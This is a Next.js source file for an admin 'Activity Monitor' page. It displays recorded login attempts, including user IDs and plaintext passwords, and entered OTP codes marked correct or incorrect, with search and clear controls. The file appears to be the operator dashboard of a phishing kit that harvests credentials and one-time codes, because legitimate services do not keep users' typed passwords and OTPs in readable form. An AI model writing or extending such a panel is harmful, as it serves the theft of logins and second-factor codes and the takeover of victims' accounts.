"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import PortalHeader from "../../components/portal-header";
import { getAdminSession, clearAdminSession, getLoginAttempts, clearLoginAttempts, getOTPAttempts, clearOTPAttempts } from "../../utils/auth";
import { LoginAttempt, OTPAttempt } from "../../data/users";

export default function AdminDashboardPage() {
  const router = useRouter();
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>(() => getLoginAttempts());
  const [otpAttempts, setOtpAttempts] = useState<OTPAttempt[]>(() => getOTPAttempts());
  const [searchTerm, setSearchTerm] = useState("");
  const [activeTab, setActiveTab] = useState<"login" | "otp">("login");
  const session = getAdminSession();
  const isAuthenticated = !!session?.isAuthenticated;
  const adminEmail = session?.email ?? "";

  useEffect(() => {
    if (!isAuthenticated) {
      router.push("/");
    }
  }, [isAuthenticated, router]);

  const handleLogout = () => {
    clearAdminSession();
    router.push("/");
  };

  const handleClearLoginAttempts = () => {
    if (confirm("Are you sure you want to clear all login attempts?")) {
      clearLoginAttempts();
      setLoginAttempts([]);
    }
  };

  const handleClearOTPAttempts = () => {
    if (confirm("Are you sure you want to clear all OTP attempts?")) {
      clearOTPAttempts();
      setOtpAttempts([]);
    }
  };

  const filteredLoginAttempts = loginAttempts.filter((attempt) => {
    const matchesSearch =
      attempt.userId.toLowerCase().includes(searchTerm.toLowerCase()) ||
      attempt.password.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesSearch;
  });

  const filteredOTPAttempts = otpAttempts.filter((attempt) => {
    const matchesSearch = attempt.otpCode.includes(searchTerm) || attempt.status.includes(searchTerm.toLowerCase());
    return matchesSearch;
  });

  if (!isAuthenticated) {
    return null;
  }

  return (
    <div className="min-h-screen bg-[#efefef] text-[#2f3a48]">
      <PortalHeader />

      <main className="w-full pt-5 pb-5 md:pt-0 md:pb-12">
        {/* Header Section */}
        <section className="w-full border-b border-[#e1e1e1] bg-white">
          <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
            <div className="flex justify-between items-center mb-4">
              <div>
                <h1 className="text-[34px] leading-tight font-normal md:text-[44px]">
                  <strong className="font-bold">Activity Monitor</strong>
                </h1>
                <p className="text-[#6b7580] mt-2">
                  Logged in as: <strong>{adminEmail}</strong>
                </p>
              </div>
              <button
                onClick={handleLogout}
                className="px-6 py-3 bg-[#f47c20] text-white font-semibold text-[16px] hover:bg-[#d96518] transition-colors rounded"
              >
                Logout
              </button>
            </div>
          </div>
        </section>

        {/* Tabs Section */}
        <section className="w-full bg-white border-b border-[#e1e1e1]">
          <div className="mx-auto w-full max-w-[1400px] px-4 md:px-10">
            <div className="flex gap-0">
              <button
                onClick={() => setActiveTab("login")}
                className={`px-6 py-4 font-semibold text-[16px] border-b-4 transition-colors ${
                  activeTab === "login"
                    ? "text-[#f47c20] border-[#f47c20]"
                    : "text-[#6b7580] border-transparent hover:text-[#2f3a48]"
                }`}
              >
                Login Attempts ({loginAttempts.length})
              </button>
              <button
                onClick={() => setActiveTab("otp")}
                className={`px-6 py-4 font-semibold text-[16px] border-b-4 transition-colors ${
                  activeTab === "otp"
                    ? "text-[#f47c20] border-[#f47c20]"
                    : "text-[#6b7580] border-transparent hover:text-[#2f3a48]"
                }`}
              >
                OTP Attempts ({otpAttempts.length})
              </button>
            </div>
          </div>
        </section>

        {/* Search and Controls Section */}
        <section className="w-full bg-white border-b border-[#e1e1e1]">
          <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-6">
            <div className="flex flex-col md:flex-row gap-4 items-end">
              <div className="flex-1">
                <label className="mb-2 block text-[14px] text-[#2f3a48] font-semibold">
                  Search
                </label>
                <input
                  type="text"
                  placeholder={activeTab === "login" ? "Search by User ID or Password..." : "Search by OTP Code or Status..."}
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full h-[50px] border border-[#c7ccd3] bg-white px-4 text-[16px] text-[#2f3a48] outline-none placeholder:text-[#6b7580] focus:border-[#f47c20] focus:shadow-[inset_4px_0_0_#f47c20]"
                />
              </div>
              <button
                onClick={activeTab === "login" ? handleClearLoginAttempts : handleClearOTPAttempts}
                className="px-6 py-3 bg-[#dc3545] text-white font-semibold text-[16px] hover:bg-[#c82333] transition-colors rounded"
              >
                Clear All
              </button>
            </div>
            <p className="mt-4 text-[14px] text-[#6b7580]">
              Showing <strong>{activeTab === "login" ? filteredLoginAttempts.length : filteredOTPAttempts.length}</strong> of{" "}
              <strong>{activeTab === "login" ? loginAttempts.length : otpAttempts.length}</strong> {activeTab === "login" ? "login attempts" : "OTP attempts"}
            </p>
          </div>
        </section>

        {/* Login Attempts Table Section */}
        {activeTab === "login" && (
          <section className="w-full bg-white">
            <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
              {filteredLoginAttempts.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="bg-[#f3f3f3] border-b border-[#e1e1e1]">
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          #
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          User ID
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          Password
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          Date
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          Time
                        </th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredLoginAttempts.map((attempt, index) => (
                        <tr
                          key={attempt.id}
                          className="border-b border-[#e1e1e1] hover:bg-[#f9f9f9] transition-colors"
                        >
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48] font-semibold">
                            {index + 1}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">
                            {attempt.userId}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48] font-mono">
                            {attempt.password}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">
                            {attempt.date}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">
                            {attempt.timestamp}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-12">
                  <p className="text-[18px] text-[#6b7580]">
                    No login attempts recorded yet.
                  </p>
                </div>
              )}
            </div>
          </section>
        )}

        {/* OTP Attempts Table Section */}
        {activeTab === "otp" && (
          <section className="w-full bg-white">
            <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
              {filteredOTPAttempts.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="bg-[#f3f3f3] border-b border-[#e1e1e1]">
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          #
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          User ID
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          OTP Code
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          Status
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          Date
                        </th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">
                          Time
                        </th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredOTPAttempts.map((attempt, index) => (
                        <tr
                          key={attempt.id}
                          className="border-b border-[#e1e1e1] hover:bg-[#f9f9f9] transition-colors"
                        >
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48] font-semibold">
                            {index + 1}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">
                            {attempt.userId}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48] font-mono font-bold">
                            {attempt.otpCode}
                          </td>
                          <td className="px-4 py-3 text-[14px]">
                            <span
                              className={`inline-block px-3 py-1 rounded text-white text-[12px] font-semibold ${
                                attempt.status === "correct"
                                  ? "bg-[#28a745]"
                                  : "bg-[#dc3545]"
                              }`}
                            >
                              {attempt.status === "correct" ? "✓ Correct" : "✗ Incorrect"}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">
                            {attempt.date}
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">
                            {attempt.timestamp}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-12">
                  <p className="text-[18px] text-[#6b7580]">
                    No OTP attempts recorded yet.
                  </p>
                </div>
              )}
            </div>
          </section>
        )}
      </main>
    </div>
  );
}
